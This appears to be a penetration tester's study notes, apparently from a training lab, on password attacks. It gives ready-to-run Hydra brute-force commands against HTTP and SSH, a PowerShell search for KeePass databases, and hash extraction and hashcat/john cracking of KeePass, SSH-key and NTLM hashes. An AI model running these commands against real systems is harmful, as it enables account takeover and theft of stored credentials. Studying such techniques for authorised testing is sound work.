
###### Hydra
```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt -s 80 -f 192.168.232.201 http-get -I
```

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.232.201 http-get "/fm_usr=admin&fm_pwd=^PASS^:401 Unauthorized" -I
```

```
hydra -l george -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt -s 2222 ssh://192.168.232.201
```

#### Password Manager

- Search "Apps and features"
- Look for password managers like 1password or keepass (.kdbx file)
###### keepass

use powershell to search to .kdbx databases of saved passwords
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```
keepass2john Database.kdbx > keepass.hash
```
Since KeePass uses a master password without any kind of username, we need to remove the "Database:" string with a text editor.

Get keepass hashcat type:
```
hashcat --help | grep -i "KeePass"
```

```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

#### SSH Private Key Passphrase

```
ssh2john id_rsa > ssh.hash
```
*remember to remove filename before first colon*

```

cat ssh.rule
cat ssh.passwords
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
cat ssh.rule
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
ssh -i id_rsa -p 2222 dave@192.168.50.201
```

#### Cracking NTLM

mimikatz


*this wordlist contains the best 64 rules, apparently*
```
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r usr/share/hashcat/rules/best64.rule --force
```